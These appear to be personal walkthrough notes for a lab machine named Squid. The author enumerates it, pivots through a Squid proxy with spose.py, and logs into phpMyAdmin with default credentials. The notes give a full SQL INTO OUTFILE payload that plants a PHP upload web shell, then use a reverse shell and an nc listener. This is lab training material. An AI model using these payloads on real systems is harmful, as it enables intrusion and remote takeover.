# NMAP 

```
sudo nmap -sC -sV -vvv 192.168.236.189 -oN nmap-squid
```

![[PG/Windows/attachments/Pasted image 20250706153026.png]]
- squid proxy port is interesting squid 4.14

All ports 

![[PG/Windows/attachments/Pasted image 20250706153545.png]]



Ruling out low hanging fruit 

# SMB 

```
nxc smb 192.168.236.189 -u 'administrator' -p 'administrator' --shares
```

No access to shares, but can add this domain to `/etc/hosts`

![[PG/Windows/attachments/Pasted image 20250706153314.png]]
DOMAIN: SQUID
Windows 10 / Server 2019 Build 17763 x64

Always try two tools

![[PG/Windows/attachments/Pasted image 20250706153432.png]]

# RPC 

```
rpcclient -U '' -N 192.168.236.189
```

![[PG/Windows/attachments/Pasted image 20250706153638.png]]
- nope 

# Squid HTTP 

Port 3128 - version 4.14

Quick googling of exploit for this didn't return anything to viable. 

Browse to port 

![[PG/Windows/attachments/Pasted image 20250706153926.png]]

Start feroxbuster 

```
feroxbuster -u http://squid:3128/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
```
- nothing 


Hovering over webmaster and see an interesting link

![[PG/Windows/attachments/Pasted image 20250706154154.png]]
- mailto webmaster 👀

Gonna intercept this mailto request with burp. oh.. it didn't work.

See error closer in Burp 

![[PG/Windows/attachments/Pasted image 20250706173629.png]]

Underscores are not allowed?

![[PG/Windows/attachments/Pasted image 20250706173659.png]]

![[PG/Windows/attachments/Pasted image 20250706173736.png]]
- FTP / Gopher 

![[PG/Windows/attachments/Pasted image 20250706173816.png]]

```
wfuzz -u 'http://squid:3128/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/api/actions.txt
```
- nothing 

Trying out this out to try to talk to an internal machine, but no connection

```
curl -x http://192.168.236.189:3128 http://127.0.0.1
```


# SPOSE 

From [hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html): 


 Squid Pivoting Open Port Scanner ([spose.py](https://github.com/aancw/spose))
```
python3 spose.py --proxy http://192.168.236.189:3128 --target 192.168.236.189
```

![[PG/Windows/attachments/Pasted image 20250706191443.png]]

Wooow

Configure the Squid Proxy in FoxyProxy 

![[PG/Windows/attachments/Pasted image 20250706191805.png]]

Turn on the proxy and navigate to `http://192.168.236.189:8080` 

![[PG/Windows/attachments/Pasted image 20250706191902.png]]

# Website 

![[PG/Windows/attachments/Pasted image 20250706192033.png]]

adminer
![[PG/Windows/attachments/Pasted image 20250706192251.png]]

Found this phpmyadmin page too.

Default creds of root and no password should work 

![[PG/Windows/attachments/Pasted image 20250706194249.png]]

Annd I'm logged in 

![[PG/Windows/attachments/Pasted image 20250706194316.png]]

There's an exploit https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f

```
|SELECT|
||"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"|
||INTO OUTFILE 'C:/wamp/www/uploader.php';|
```
Create a file called uploader.php to insert into the SQL console

Enter this into SQL console
```
SELECT  
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"  
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

![[PG/Windows/attachments/Pasted image 20250706210252.png]]

Browse to uploader.php

waaaaat

![[PG/Windows/attachments/Pasted image 20250706210409.png]]

Upload Ivan Sincek reverse shell

https://www.revshells.com/

Start nc listener 

```
rlwrap nc -lvnp 9001
```

![[PG/Windows/attachments/Pasted image 20250706211013.png]]

Catch reverse shell

![[PG/Windows/attachments/Pasted image 20250706211037.png]]

oh shit 

![[PG/Windows/attachments/Pasted image 20250706211055.png]]
niiice
